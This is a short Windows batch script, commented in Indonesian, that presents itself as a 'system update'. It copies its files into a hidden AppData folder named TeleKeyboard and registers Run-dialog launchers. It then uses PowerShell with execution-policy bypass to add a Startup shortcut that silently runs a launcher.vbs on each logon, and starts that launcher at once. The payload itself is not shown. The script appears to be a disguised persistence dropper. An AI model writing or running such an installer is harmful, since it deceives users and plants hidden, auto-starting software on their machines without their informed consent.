@echo off
title update system
cd /d "%~dp0"

echo ===============
echo   update system...
echo ===============
:: 1. Tentukan folder tujuan di AppData (tersembunyi, tidak menuh-menuhin layar)
set "TARGET_DIR=%LOCALAPPDATA%\TeleKeyboard"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
xcopy /E /I /Y /Q "%~dp0*" "%TARGET_DIR%\" >nul

:: 2. Daftarkan perintah ke Win+R via WindowsApps
set "WINAPPS=%LOCALAPPDATA%\Microsoft\WindowsApps"
if not exist "%WINAPPS%" mkdir "%WINAPPS%"

echo @start "" wscript.exe "%%LOCALAPPDATA%%\TeleKeyboard\launcher.vbs" > "%WINAPPS%\telekeyboard.cmd"
echo @start "" wscript.exe "%%LOCALAPPDATA%%\TeleKeyboard\launcher.vbs" > "%WINAPPS%\tk.cmd"
echo @start "" wscript.exe "%%LOCALAPPDATA%%\TeleKeyboard\launcher.vbs" > "%WINAPPS%\keyboard.cmd"

:: 3. Daftarkan Auto-Start di Startup Windows
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut([Environment]::GetFolderPath('Startup') + '\TeleKeyboard.lnk'); $s.TargetPath = 'wscript.exe'; $s.Arguments = '\"' + $env:LOCALAPPDATA + '\TeleKeyboard\launcher.vbs\"'; $s.WorkingDirectory = $env:LOCALAPPDATA + '\TeleKeyboard'; $s.Save()"

:: 4. Jalankan launcher pertama kali (tanpa CMD, buka Notepad)
wscript.exe "%TARGET_DIR%\launcher.vbs"

echo  %TARGET_DIR%.
echo  'done'.
timeout /t 1 >nul
exit
